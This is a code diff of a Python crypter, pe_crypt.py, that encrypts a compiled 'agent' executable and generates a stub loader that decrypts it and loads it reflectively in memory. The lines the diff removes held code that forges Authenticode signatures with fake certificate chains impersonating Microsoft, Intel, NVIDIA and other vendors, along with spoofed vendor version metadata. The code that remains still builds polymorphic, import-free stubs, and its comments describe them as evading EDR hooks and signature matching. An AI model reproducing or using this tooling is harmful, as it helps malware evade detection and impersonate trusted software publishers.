@@ -6,15 +6,9 @@ Takes a compiled agent .exe, encrypts it with RC4 (derived key from seed),
 and generates a stub loader that decrypts + reflectively loads the agent
 in memory.
 
-The stub links kernel32 for a legitimate IAT (benign API calls in the
-entry point create real import entries) while all critical memory ops
-(NtAllocateVirtualMemory, NtProtectVirtualMemory) go through ntdll
-resolved via PEB walk — no hooks for EDR to intercept.
-
-Each invocation produces a unique binary: different seed, different key,
-different ciphertext, randomised VERSIONINFO metadata, self-signed
-Authenticode signature, and varied junk code — no static signature
-match across builds.
+The stub has ZERO IAT imports — all APIs resolved at runtime via PEB walk.
+Each invocation produces a unique binary (different seed → different key →
+different ciphertext → no static signature match).
 
 Usage:
     python pe_crypt.py --input builds/agent_payload.exe --output builds/agent.exe
@@ -23,8 +17,6 @@ Called automatically by build_agent_c.py during the two-pass build.
 """
 
 import argparse
-import datetime
-import hashlib
 import math
 import os
 import random
@@ -157,623 +149,32 @@ def generate_stub_payload_h(encoded: bytes, seed: bytes, decoded_size: int) -> s
 
 
 def generate_junk_functions() -> str:
-    """Generate random junk C functions to vary the stub binary.
-
-    Produces a mix of patterns: arithmetic chains, simple string buffers,
-    loops with accumulators, and conditional branches — enough variety
-    that each build's .text section looks structurally different.
-    """
+    """Generate random junk C functions to vary the stub binary."""
     rng = random.SystemRandom()
     funcs = []
-    num_funcs = rng.randint(4, 9)
+    num_funcs = rng.randint(3, 7)
 
     for i in range(num_funcs):
-        name = "".join(rng.choices(string.ascii_lowercase, k=rng.randint(6, 14)))
-        pattern = rng.choice(["arith", "loop", "branch", "buffer"])
+        name = "".join(rng.choices(string.ascii_lowercase, k=rng.randint(6, 12)))
+        ret_type = rng.choice(["int", "unsigned int", "unsigned long"])
+        body_ops = []
+        var = "x"
+        body_ops.append(f"    {ret_type} {var} = {rng.randint(1, 0xFFFF)};")
+        for _ in range(rng.randint(4, 10)):
+            op = rng.choice(["+", "^", "*", "-", "<<", ">>"])
+            val = rng.randint(1, 255)
+            if op in ("<<", ">>"):
+                val = rng.randint(1, 15)
+            body_ops.append(f"    {var} = {var} {op} {val};")
+        body_ops.append(f"    return {var};")
 
-        if pattern == "arith":
-            # Classic arithmetic chain
-            ret_type = rng.choice(["int", "unsigned int", "unsigned long"])
-            body = [f"    {ret_type} x = {rng.randint(1, 0xFFFF)};"]
-            for _ in range(rng.randint(5, 12)):
-                op = rng.choice(["+", "^", "*", "-", "<<", ">>", "|", "&"])
-                val = rng.randint(1, 255) if op not in ("<<", ">>") else rng.randint(1, 15)
-                body.append(f"    x = x {op} {val};")
-            body.append("    return x;")
-            funcs.append(
-                f"static __attribute__((used)) {ret_type} {name}(void) {{\n"
-                + "\n".join(body) + "\n}\n"
-            )
-
-        elif pattern == "loop":
-            # Loop with accumulator
-            iters = rng.randint(4, 20)
-            body = [
-                f"    unsigned int acc = 0x{rng.randint(1, 0xFFFF):04X};",
-                f"    for (int i = 0; i < {iters}; i++) {{",
-            ]
-            op = rng.choice(["^", "+", "*"])
-            body.append(f"        acc = acc {op} (i + {rng.randint(1, 127)});")
-            if rng.random() > 0.5:
-                body.append(f"        acc = (acc << {rng.randint(1, 7)}) | (acc >> {32 - rng.randint(1, 7)});")
-            body += ["    }", "    return acc;"]
-            funcs.append(
-                f"static __attribute__((used)) unsigned int {name}(void) {{\n"
-                + "\n".join(body) + "\n}\n"
-            )
-
-        elif pattern == "branch":
-            # Conditional branches
-            ret_type = "unsigned long"
-            init_val = rng.randint(0, 0xFFFF)
-            body = [f"    {ret_type} v = {init_val};"]
-            for _ in range(rng.randint(2, 5)):
-                threshold = rng.randint(1, 0xFFFF)
-                op_a = rng.choice(["^", "+", "*"])
-                op_b = rng.choice(["^", "-", "+"])
-                val_a = rng.randint(1, 0xFF)
-                val_b = rng.randint(1, 0xFF)
-                body += [
-                    f"    if (v > {threshold})",
-                    f"        v = v {op_a} {val_a};",
-                    f"    else",
-                    f"        v = v {op_b} {val_b};",
-                ]
-            body.append("    return v;")
-            funcs.append(
-                f"static __attribute__((used)) {ret_type} {name}(void) {{\n"
-                + "\n".join(body) + "\n}\n"
-            )
-
-        else:  # buffer
-            # Stack buffer manipulation — looks like string processing
-            buf_sz = rng.randint(8, 32)
-            body = [f"    char buf[{buf_sz}];"]
-            for j in range(min(buf_sz, rng.randint(4, buf_sz))):
-                body.append(f"    buf[{j}] = {rng.randint(0x20, 0x7E)};")
-            body += [
-                f"    unsigned int h = 0;",
-                f"    for (int i = 0; i < {min(buf_sz, rng.randint(4, buf_sz))}; i++)",
-                f"        h = h * 31 + buf[i];",
-                f"    return h;",
-            ]
-            funcs.append(
-                f"static __attribute__((used)) unsigned int {name}(void) {{\n"
-                + "\n".join(body) + "\n}\n"
-            )
+        funcs.append(
+            f"static __attribute__((used)) {ret_type} {name}(void) {{\n"
+            + "\n".join(body_ops)
+            + "\n}\n"
+        )
 
     return "\n".join(funcs)
-
-
-# ── VERSIONINFO resource generation ──────────────────────────────────────
-
-# Pools of plausible values for randomised PE metadata.
-# Each build picks a random combination → unique VERSIONINFO per binary.
-_COMPANY_POOL = [
-    "Microsoft Corporation", "Intel Corporation", "NVIDIA Corporation",
-    "Realtek Semiconductor Corp.", "Logitech Inc.", "Dell Technologies",
-    "Hewlett-Packard Company", "Lenovo Group Limited", "ASUS Computer Inc.",
-    "Broadcom Corporation", "Synaptics Incorporated", "Texas Instruments",
-    "Qualcomm Technologies Inc.", "Advanced Micro Devices Inc.",
-]
-
-_PRODUCT_POOL = [
-    "System Configuration Utility", "Hardware Monitor Service",
-    "Display Adapter Helper", "Audio Control Panel",
-    "Network Configuration Manager", "Power Management Service",
-    "Storage Optimization Tool", "Device Firmware Update",
-    "Performance Data Collector", "Telemetry Client Helper",
-    "Peripheral Configuration Tool", "Driver Update Assistant",
-    "Security Health Service", "Diagnostic Data Runtime",
-]
-
-_DESCRIPTION_POOL = [
-    "Manages system hardware configuration",
-    "Provides device monitoring and telemetry",
-    "Handles display adapter configuration changes",
-    "Coordinates audio device settings",
-    "Manages network adapter properties",
-    "Monitors power state transitions",
-    "Optimizes storage device performance",
-    "Firmware update coordination service",
-    "Collects system performance metrics",
-    "Processes diagnostic telemetry data",
-    "Configures attached peripheral devices",
-    "Coordinates driver update operations",
-]
-
-_INTERNAL_NAMES = [
-    "svcutil", "devmon", "dxhelper", "audcfg", "netcfg",
-    "pwrmgr", "stgopt", "fwupd", "perfcol", "telrun",
-    "pericfg", "drvupd", "hlthsvc", "diagrt",
-]
-
-# Mapping of company names → realistic intermediate CA names.
-# The CA cert mimics the issuing authority that would have signed
-# a code-signing certificate for that company.  If a company is
-# not in the map, a generic "<Company> Code Signing CA" is used.
-_CA_CHAIN_MAP = {
-    "Microsoft Corporation":
-        "Microsoft Code Signing PCA 2011",
-    "Intel Corporation":
-        "Intel External Basic Issuing CA 3B",
-    "NVIDIA Corporation":
-        "NVIDIA Signing CA 2014",
-    "Realtek Semiconductor Corp.":
-        "Symantec Class 3 SHA256 Code Signing CA",
-    "Logitech Inc.":
-        "DigiCert SHA2 Assured ID Code Signing CA",
-    "Dell Technologies":
-        "DigiCert Trusted G4 Code Signing RSA4096 SHA384 2021 CA1",
-    "Hewlett-Packard Company":
-        "DigiCert SHA2 Assured ID Code Signing CA",
-    "Lenovo Group Limited":
-        "DigiCert SHA2 Assured ID Code Signing CA",
-    "ASUS Computer Inc.":
-        "DigiCert SHA2 Assured ID Code Signing CA",
-    "Broadcom Corporation":
-        "Symantec Class 3 SHA256 Code Signing CA",
-    "Synaptics Incorporated":
-        "DigiCert SHA2 Assured ID Code Signing CA",
-    "Texas Instruments":
-        "DigiCert SHA2 Assured ID Code Signing CA",
-    "Qualcomm Technologies Inc.":
-        "DigiCert SHA2 Assured ID Code Signing CA",
-    "Advanced Micro Devices Inc.":
-        "DigiCert SHA2 Assured ID Code Signing CA",
-}
-
-
-def generate_versioninfo_rc() -> str:
-    """Generate a randomised VERSIONINFO .rc file.
-
-    Picks plausible company/product/description combinations and random
-    version numbers. The resulting resource makes the PE look like a
-    legitimate vendor utility.
-    """
-    rng = random.SystemRandom()
-
-    company = rng.choice(_COMPANY_POOL)
-    product = rng.choice(_PRODUCT_POOL)
-    description = rng.choice(_DESCRIPTION_POOL)
-    internal = rng.choice(_INTERNAL_NAMES)
-
-    major = rng.randint(1, 10)
-    minor = rng.randint(0, 9)
-    build = rng.randint(100, 9999)
-    patch = rng.randint(0, 99)
-    ver_str = f"{major}.{minor}.{build}.{patch}"
-    ver_csv = f"{major},{minor},{build},{patch}"
-
-    copyright_year = rng.randint(2019, 2025)
-
-    return f"""#include <winver.h>
-
-VS_VERSION_INFO VERSIONINFO
-    FILEVERSION    {ver_csv}
-    PRODUCTVERSION {ver_csv}
-    FILEFLAGSMASK  VS_FFI_FILEFLAGSMASK
-    FILEFLAGS      0x0
-    FILEOS         VOS_NT_WINDOWS32
-    FILETYPE       VFT_APP
-    FILESUBTYPE    VFT2_UNKNOWN
-BEGIN
-    BLOCK "StringFileInfo"
-    BEGIN
-        BLOCK "040904B0"
-        BEGIN
-            VALUE "CompanyName",      "{company}"
-            VALUE "FileDescription",  "{description}"
-            VALUE "FileVersion",      "{ver_str}"
-            VALUE "InternalName",     "{internal}"
-            VALUE "LegalCopyright",   "Copyright (C) {copyright_year} {company}"
-            VALUE "OriginalFilename", "{internal}.exe"
-            VALUE "ProductName",      "{product}"
-            VALUE "ProductVersion",   "{ver_str}"
-        END
-    END
-    BLOCK "VarFileInfo"
-    BEGIN
-        VALUE "Translation", 0x0409, 0x04B0
-    END
-END
-"""
-
-
-# ── DER encoding helpers (for Authenticode PKCS#7 construction) ─────────
-
-def _der_len(length: int) -> bytes:
-    """Encode a DER definite length."""
-    if length < 0x80:
-        return bytes([length])
-    elif length < 0x100:
-        return bytes([0x81, length])
-    elif length < 0x10000:
-        return bytes([0x82, (length >> 8) & 0xFF, length & 0xFF])
-    else:
-        return bytes([0x83, (length >> 16) & 0xFF,
-                      (length >> 8) & 0xFF, length & 0xFF])
-
-
-def _der_tlv(tag: int, value: bytes) -> bytes:
-    """Build a DER Tag-Length-Value triple."""
-    return bytes([tag]) + _der_len(len(value)) + value
-
-
-def _der_seq(*parts: bytes) -> bytes:
-    return _der_tlv(0x30, b''.join(parts))
-
-
-def _der_set(*parts: bytes) -> bytes:
-    return _der_tlv(0x31, b''.join(parts))
-
-
-def _der_oid(dotted: str) -> bytes:
-    """Encode an OBJECT IDENTIFIER from dotted notation."""
-    components = [int(x) for x in dotted.split('.')]
-
-    def _base128(v):
-        if v < 128:
-            return bytes([v])
-        out = []
-        out.append(v & 0x7F)
-        v >>= 7
-        while v:
-            out.append((v & 0x7F) | 0x80)
-            v >>= 7
-        out.reverse()
-        return bytes(out)
-
-    body = _base128(40 * components[0] + components[1])
-    for c in components[2:]:
-        body += _base128(c)
-    return _der_tlv(0x06, body)
-
-
-def _der_int(value: int) -> bytes:
-    """Encode a non-negative INTEGER."""
-    if value == 0:
-        return _der_tlv(0x02, b'\x00')
-    h = format(value, 'x')
-    if len(h) % 2:
-        h = '0' + h
-    b = bytes.fromhex(h)
-    if b[0] & 0x80:
-        b = b'\x00' + b
-    return _der_tlv(0x02, b)
-
-
-def _der_oct(data: bytes) -> bytes:
-    return _der_tlv(0x04, data)
-
-
-def _der_bitstr(data: bytes, unused: int = 0) -> bytes:
-    return _der_tlv(0x03, bytes([unused]) + data)
-
-
-def _der_null() -> bytes:
-    return b'\x05\x00'
-
-
-def _der_utctime(dt: datetime.datetime) -> bytes:
-    return _der_tlv(0x17, dt.strftime('%y%m%d%H%M%SZ').encode('ascii'))
-
-
-# Authenticode OIDs
-_OID_SIGNED_DATA   = '1.2.840.113549.1.7.2'
-_OID_SPC_INDIRECT  = '1.3.6.1.4.1.311.2.1.4'
-_OID_SPC_PE_IMAGE  = '1.3.6.1.4.1.311.2.1.15'
-_OID_SHA256         = '2.16.840.1.101.3.4.2.1'
-_OID_RSA            = '1.2.840.113549.1.1.1'
-_OID_SPC_OPUS_INFO  = '1.3.6.1.4.1.311.2.1.12'
-_OID_CONTENT_TYPE   = '1.2.840.113549.1.9.3'
-_OID_SIGNING_TIME   = '1.2.840.113549.1.9.5'
-_OID_MESSAGE_DIGEST = '1.2.840.113549.1.9.4'
-
-
-def _sha256_alg_id() -> bytes:
-    """AlgorithmIdentifier for SHA-256."""
-    return _der_seq(_der_oid(_OID_SHA256), _der_null())
-
-
-def _build_spc_indirect_data(pe_hash: bytes) -> bytes:
-    """Build the SpcIndirectDataContent SEQUENCE."""
-    # SpcPeImageFlags: BIT STRING with 6 unused bits, value 0x00
-    # (matches osslsigncode — explicit zero-flags byte, not empty)
-    spc_flags = b'\x03\x02\x06\x00'
-    # SpcLink.file: BMPString "<<<Obsolete>>>" (standard Authenticode filler)
-    _obsolete_bmp = '<<<Obsolete>>>'.encode('utf-16-be')
-    spc_pe_image = _der_seq(
-        spc_flags,
-        _der_tlv(0xA0,                                 # [0] EXPLICIT
-            _der_tlv(0xA2,                              # [2] EXPLICIT file
-                _der_tlv(0x80, _obsolete_bmp)           # [0] IMPLICIT BMPString
-            )
-        )
-    )
-    spc_attr = _der_seq(_der_oid(_OID_SPC_PE_IMAGE), spc_pe_image)
-    digest_info = _der_seq(_sha256_alg_id(), _der_oct(pe_hash))
-    return _der_seq(spc_attr, digest_info)
-
-
-def _build_auth_attrs_body(content_digest: bytes,
-                           signing_time: datetime.datetime,
-                           description: str = "") -> bytes:
-    """Build authenticated attributes (sorted SET OF Attribute).
-
-    Returns raw concatenated DER of the four attributes.
-    Caller wraps in [0] IMPLICIT (0xA0) for PKCS#7 or SET (0x31)
-    for signing.
-
-    The SPC_SP_OPUS_INFO attribute carries the program description
-    that Windows shows as the signer subject in Properties →
-    Digital Signatures.
-    """
-    attr_ct = _der_seq(
-        _der_oid(_OID_CONTENT_TYPE),
-        _der_set(_der_oid(_OID_SPC_INDIRECT)),
-    )
-    attr_st = _der_seq(
-        _der_oid(_OID_SIGNING_TIME),
-        _der_set(_der_utctime(signing_time)),
-    )
-    attr_md = _der_seq(
-        _der_oid(_OID_MESSAGE_DIGEST),
-        _der_set(_der_oct(content_digest)),
-    )
-
-    # SPC_SP_OPUS_INFO — populates signer name in Windows properties
-    if description:
-        opus_body = _der_seq(
-            _der_tlv(0xA0,                          # programName [0] EXPLICIT
-                _der_tlv(0x80,                      # BMPString [0] IMPLICIT
-                    description.encode('utf-16-be'))
-            )
-        )
-    else:
-        opus_body = _der_seq()
-    attr_opus = _der_seq(
-        _der_oid(_OID_SPC_OPUS_INFO),
-        _der_set(opus_body),
-    )
-
-    # DER SET OF: elements sorted by their encoded value
-    return b''.join(sorted([attr_ct, attr_st, attr_md, attr_opus]))
-
-
-def _pe_checksum(data: bytearray) -> int:
-    """Compute PE checksum (same algorithm as Windows imagehlp)."""
-    e_lfanew = struct.unpack_from('<I', data, 0x3C)[0]
-    csum_off = e_lfanew + 4 + 20 + 64
-    csum = 0
-    top = 1 << 32
-    for i in range(0, len(data) & ~1, 2):
-        if i == csum_off or i == csum_off + 2:
-            continue
-        csum += data[i] | (data[i + 1] << 8)
-        if csum >= top:
-            csum = (csum & 0xFFFF) + (csum >> 16)
-    if len(data) % 2:
-        csum += data[-1]
-        if csum >= top:
-            csum = (csum & 0xFFFF) + (csum >> 16)
-    csum = (csum & 0xFFFF) + (csum >> 16)
-    csum = (csum & 0xFFFF) + (csum >> 16)
-    csum += len(data)
-    return csum & 0xFFFFFFFF
-
-
-# ── Authenticode signing with 2-level certificate chain ────────────────
-
-def _sign_pe_python(exe_path, company: str, description: str = "") -> bool:
-    """Authenticode signing with a 2-level cert chain — pure Python.
-
-    Generates a fake intermediate CA cert (e.g. "Microsoft Code Signing
-    PCA 2011") and a leaf code-signing cert (e.g. "Microsoft Corporation")
-    signed by the CA.  Both certs are embedded in the PKCS#7 certificates
-    field, producing a realistic-looking chain in the Windows Digital
-    Signatures dialog.
-
-    Uses the ``cryptography`` library for RSA key generation, X.509
-    certificate creation, and PKCS#1 v1.5 signing.  The Authenticode-
-    specific PKCS#7 / SpcIndirectDataContent / WIN_CERTIFICATE embedding
-    is hand-rolled DER — zero CLI dependencies (no openssl, no
-    osslsigncode).
-
-    Returns True on success, False on failure (best-effort — the
-    unsigned binary is still functional).
-    """
-    try:
-        from cryptography import x509
-        from cryptography.hazmat.primitives import hashes, serialization
-        from cryptography.hazmat.primitives.asymmetric import (
-            rsa, padding as asym_padding)
-        from cryptography.x509.oid import NameOID
-    except ImportError:
-        print("[!] cryptography library not installed — signing skipped")
-        return False
-
-    rng = random.SystemRandom()
-    exe_path = Path(exe_path)
-    pe_data = bytearray(exe_path.read_bytes())
-
-    # ── Validate PE ──
-    if pe_data[:2] != b'MZ':
-        print("[!] Not a valid PE — signing skipped")
-        return False
-    e_lfanew = struct.unpack_from('<I', pe_data, 0x3C)[0]
-    if pe_data[e_lfanew:e_lfanew + 4] != b'PE\x00\x00':
-        print("[!] Invalid PE signature — signing skipped")
-        return False
-
-    opt_offset = e_lfanew + 4 + 20
-    magic = struct.unpack_from('<H', pe_data, opt_offset)[0]
-    checksum_offset = opt_offset + 64
-    if magic == 0x20b:
-        cert_dd_offset = opt_offset + 144
-    elif magic == 0x10b:
-        cert_dd_offset = opt_offset + 128
-    else:
-        print(f"[!] Unknown PE magic 0x{magic:04x} — signing skipped")
-        return False
-
-    # ── Generate 2-level certificate chain ──
-    # Level 1: Intermediate CA (self-signed, mimics the issuing authority)
-    # Level 2: Leaf code-signing cert (signed by the CA)
-
-    ca_key = rsa.generate_private_key(
-        public_exponent=65537, key_size=2048)
-    leaf_key = rsa.generate_private_key(
-        public_exponent=65537, key_size=2048)
-
-    _OU = ["Software Engineering", "Product Development",
-           "Driver Development", "Platform Engineering",
-           "Systems Software", "Core Services",
-           "Client Software", "Release Engineering"]
-    _LOC = ["Santa Clara", "Redmond", "Austin", "San Jose",
-            "Round Rock", "Palo Alto", "Irvine", "Hillsboro"]
-    _ST = ["California", "Washington", "Texas", "Oregon"]
-
-    now = datetime.datetime.utcnow()
-
-    # Look up realistic CA name for this company
-    ca_cn = _CA_CHAIN_MAP.get(company, f"{company} Code Signing CA")
-
-    # -- CA cert (self-signed intermediate) --
-    ca_subject = x509.Name([
-        x509.NameAttribute(NameOID.COUNTRY_NAME, "US"),
-        x509.NameAttribute(NameOID.ORGANIZATION_NAME, company.split()[0]
-                           if "Microsoft" in company else company),
-        x509.NameAttribute(NameOID.COMMON_NAME, ca_cn),
-    ])
-
-    ca_cert = (
-        x509.CertificateBuilder()
-        .subject_name(ca_subject)
-        .issuer_name(ca_subject)                   # self-signed
-        .public_key(ca_key.public_key())
-        .serial_number(x509.random_serial_number())
-        .not_valid_before(now - datetime.timedelta(days=rng.randint(730, 1825)))
-        .not_valid_after(now + datetime.timedelta(days=rng.randint(1095, 3650)))
-        .add_extension(
-            x509.BasicConstraints(ca=True, path_length=0),
-            critical=True)
-        .add_extension(
-            x509.KeyUsage(
-                digital_signature=False, content_commitment=False,
-                key_encipherment=False, data_encipherment=False,
-                key_agreement=False, key_cert_sign=True,
-                crl_sign=True, encipher_only=False,
-                decipher_only=False),
-            critical=True)
-        .sign(ca_key, hashes.SHA256())
-    )
-
-    # -- Leaf cert (signed by CA key) --
-    leaf_subject = x509.Name([
-        x509.NameAttribute(NameOID.COUNTRY_NAME, "US"),
-        x509.NameAttribute(NameOID.STATE_OR_PROVINCE_NAME, rng.choice(_ST)),
-        x509.NameAttribute(NameOID.LOCALITY_NAME, rng.choice(_LOC)),
-        x509.NameAttribute(NameOID.ORGANIZATION_NAME, company),
-        x509.NameAttribute(NameOID.ORGANIZATIONAL_UNIT_NAME, rng.choice(_OU)),
-        x509.NameAttribute(NameOID.COMMON_NAME, company),
-    ])
-
-    leaf_cert = (
-        x509.CertificateBuilder()
-        .subject_name(leaf_subject)
-        .issuer_name(ca_subject)                   # issued by CA
-        .public_key(leaf_key.public_key())
-        .serial_number(x509.random_serial_number())
-        .not_valid_before(now - datetime.timedelta(days=rng.randint(0, 365)))
-        .not_valid_after(now + datetime.timedelta(days=rng.randint(365, 1095)))
-        .add_extension(
-            x509.ExtendedKeyUsage(
-                [x509.oid.ExtendedKeyUsageOID.CODE_SIGNING]),
-            critical=False)
-        .add_extension(
-            x509.KeyUsage(
-                digital_signature=True, content_commitment=False,
-                key_encipherment=False, data_encipherment=False,
-                key_agreement=False, key_cert_sign=False,
-                crl_sign=False, encipher_only=False,
-                decipher_only=False),
-            critical=True)
-        .sign(ca_key, hashes.SHA256())             # signed by CA key
-    )
-
-    ca_cert_der = ca_cert.public_bytes(serialization.Encoding.DER)
-    leaf_cert_der = leaf_cert.public_bytes(serialization.Encoding.DER)
-
-    # SignerInfo references the leaf cert (issuer = CA, serial = leaf's)
-    leaf_issuer_der = leaf_cert.issuer.public_bytes()
-    leaf_serial = leaf_cert.serial_number
-
-    # ── Compute Authenticode PE hash ──
-    pe_data[checksum_offset:checksum_offset + 4] = b'\x00' * 4
-    pe_data[cert_dd_offset:cert_dd_offset + 8] = b'\x00' * 8
-
-    pe_hash = hashlib.sha256()
-    pe_hash.update(pe_data[:checksum_offset])
-    pe_hash.update(pe_data[checksum_offset + 4:cert_dd_offset])
-    pe_hash.update(pe_data[cert_dd_offset + 8:])
-    pe_hash = pe_hash.digest()
-
-    # ── Build PKCS#7 SignedData ──
-    spc_content = _build_spc_indirect_data(pe_hash)
-
-    content_digest = hashlib.sha256(spc_content).digest()
-    attrs_body = _build_auth_attrs_body(content_digest, now, description)
-
-    # Sign authenticated attrs with the LEAF key (re-tagged as SET 0x31)
-    attrs_for_signing = _der_tlv(0x31, attrs_body)
-    signature = leaf_key.sign(
-        attrs_for_signing, asym_padding.PKCS1v15(), hashes.SHA256())
-
-    signer_info = _der_seq(
-        _der_int(1),
-        _der_seq(leaf_issuer_der, _der_int(leaf_serial)),
-        _sha256_alg_id(),
-        _der_tlv(0xA0, attrs_body),               # authenticatedAttributes [0]
-        _der_seq(_der_oid(_OID_RSA), _der_null()), # digestEncryptionAlgorithm
-        _der_oct(signature),
-    )
-
-    # Both certs in the chain: leaf first, then CA
-    all_certs = leaf_cert_der + ca_cert_der
-
-    signed_data = _der_seq(
-        _der_int(1),
-        _der_set(_sha256_alg_id()),
-        _der_seq(_der_oid(_OID_SPC_INDIRECT),
-                 _der_tlv(0xA0, spc_content)),     # [0] EXPLICIT content
-        _der_tlv(0xA0, all_certs),                 # certificates [0] IMPLICIT
-        _der_set(signer_info),
-    )
-
-    pkcs7 = _der_seq(
-        _der_oid(_OID_SIGNED_DATA),
-        _der_tlv(0xA0, signed_data),               # [0] EXPLICIT
-    )
-
-    # ── Embed WIN_CERTIFICATE in PE ──
-    win_cert = struct.pack('<IHH', 8 + len(pkcs7), 0x0200, 0x0002) + pkcs7
-    win_cert += b'\x00' * ((8 - len(win_cert) % 8) % 8)  # 8-byte align
-
-    # Pad PE to 8-byte boundary before cert table
-    pe_data += b'\x00' * ((8 - len(pe_data) % 8) % 8)
-    cert_table_rva = len(pe_data)
-    struct.pack_into('<II', pe_data, cert_dd_offset,
-                     cert_table_rva, len(win_cert))
-    pe_data += win_cert
-
-    # Recompute PE checksum
-    struct.pack_into('<I', pe_data, checksum_offset, _pe_checksum(pe_data))
-
-    exe_path.write_bytes(pe_data)
-    print(f"[+] Authenticode signature applied (2-cert chain: "
-          f"{ca_cn} → {company})")
-    return True
 
 
 def build_stub(
@@ -783,64 +184,30 @@ def build_stub(
     arch: str = "x64",
     junk_code: str = "",
     debug: bool = False,
-    sign: bool = True,
 ) -> Path:
     """Compile the stub loader with the encrypted payload.
 
-    The stub is compiled with -nostdlib (no CRT startup) but LINKS
-    kernel32 so that the benign API calls in the entry point generate
-    real IAT entries.  Critical memory ops use Nt* functions resolved
-    from ntdll via PEB walk — no EDR-hooked kernel32 VirtualAlloc in
-    the hot path.
-
-    A randomised VERSIONINFO resource is compiled with windres and
-    linked into every build, giving the PE the metadata profile of a
-    legitimate vendor utility.
+    CRITICAL: The stub is compiled with -nostdlib and a custom entry point.
+    This means ZERO CRT code, ZERO default IAT imports.
+    No GetModuleHandleA, no GetProcAddress, no VirtualAlloc in the IAT.
+    All APIs are resolved at runtime via PEB walk + export table parsing.
     """
 
     cc = "x86_64-w64-mingw32-gcc" if arch == "x64" else "i686-w64-mingw32-gcc"
-    windres = "x86_64-w64-mingw32-windres" if arch == "x64" else "i686-w64-mingw32-windres"
     strip_cmd = "x86_64-w64-mingw32-strip" if arch == "x64" else "i686-w64-mingw32-strip"
 
     if not shutil.which(cc):
         raise FileNotFoundError(f"{cc} not found. Install mingw-w64.")
 
-    build_dir = payload_header.parent
-
-    # ── Generate and compile VERSIONINFO resource ──
-    rc_path = build_dir / "version.rc"
-    rc_obj_path = build_dir / "version.o"
-    vi_content = generate_versioninfo_rc()
-    rc_path.write_text(vi_content)
-
-    # Extract company name from the .rc for consistent cert CN
-    _vi_company = ""
-    for line in vi_content.splitlines():
-        if '"CompanyName"' in line:
-            _vi_company = line.split('"')[-2]
-            break
-
-    if shutil.which(windres):
-        rc_result = subprocess.run(
-            [windres, str(rc_path), "-o", str(rc_obj_path)],
-            capture_output=True, text=True
-        )
-        if rc_result.returncode != 0:
-            print(f"[!] windres warning (VERSIONINFO skipped): {rc_result.stderr}")
-            rc_obj_path = None
-    else:
-        print("[!] windres not found — VERSIONINFO resource skipped")
-        rc_obj_path = None
-
     # Write junk code to a separate file if any
-    junk_path = build_dir / "stub_junk.h"
+    junk_path = payload_header.parent / "stub_junk.h"
     junk_path.write_text(
         f"/* Auto-generated junk code for polymorphism */\n{junk_code}\n"
     )
 
     cmd = [
         cc,
-        f"-I{build_dir}",
+        f"-I{payload_header.parent}",
         "-Wall", "-Os", "-s",
         "-fno-asynchronous-unwind-tables",
         "-fno-ident",
@@ -853,19 +220,12 @@ def build_stub(
         "-include", str(junk_path),
         "-o", str(output_exe),
         str(stub_src),
-    ]
-
-    # Link the VERSIONINFO .o if we compiled it
-    if rc_obj_path and rc_obj_path.exists():
-        cmd.append(str(rc_obj_path))
-
-    cmd += [
-        # ── No CRT, but kernel32 for legitimate IAT ──
+        # ── CRITICAL: No CRT, no default libs ──
         "-nostdlib",                   # No libc, no CRT startup
         "-Wl,-e,_stub_entry",         # Direct entry point (no WinMainCRTStartup)
         "-Wl,--subsystem,windows",
         "-Wl,--gc-sections",
-        "-lkernel32",                  # Legitimate IAT from entry-point API calls
+        # No -lkernel32, no -static-libgcc — ZERO IAT imports
     ]
 
     result = subprocess.run(cmd, capture_output=True, text=True)
@@ -875,15 +235,6 @@ def build_stub(
     # Strip symbols
     if shutil.which(strip_cmd):
         subprocess.run([strip_cmd, "--strip-all", str(output_exe)], capture_output=True)
-
-    # ── Self-signed Authenticode signature (pure Python) ──
-    if sign and _vi_company:
-        _vi_desc = ""
-        for line in vi_content.splitlines():
-            if '"FileDescription"' in line:
-                _vi_desc = line.split('"')[-2]
-                break
-        _sign_pe_python(output_exe, _vi_company, description=_vi_desc)
 
     return output_exe
 
@@ -916,7 +267,6 @@ def crypt_pe(
     key_size: int = 32,
     debug: bool = False,
     candidates: int = NUM_CANDIDATES,
-    sign: bool = True,
 ) -> Path:
     """
     Full crypter pipeline:
@@ -964,8 +314,7 @@ def crypt_pe(
             raise FileNotFoundError(f"Stub source not found: {stub_src}")
 
         # Compile only the winner
-        build_stub(stub_src, header_path, output_exe, arch, junk,
-                   debug=debug, sign=sign)
+        build_stub(stub_src, header_path, output_exe, arch, junk, debug=debug)
 
         final_entropy = shannon_entropy(output_exe.read_bytes())
         print(f"[+] Crypter: {pe_size} bytes → "
@@ -992,8 +341,6 @@ def main():
                         help="Seed size in bytes (default: 32)")
     parser.add_argument("--candidates", type=int, default=NUM_CANDIDATES,
                         help=f"Number of encryption candidates to evaluate (default: {NUM_CANDIDATES})")
-    parser.add_argument("--no-sign", action="store_true",
-                        help="Skip self-signed Authenticode signing")
     args = parser.parse_args()
 
     if not args.input.exists():
@@ -1008,7 +355,7 @@ def main():
     args.output.parent.mkdir(parents=True, exist_ok=True)
 
     crypt_pe(args.input, args.output, stub_dir, args.arch, args.key_size,
-             candidates=args.candidates, sign=not args.no_sign)
+             candidates=args.candidates)
 
 
 if __name__ == "__main__":
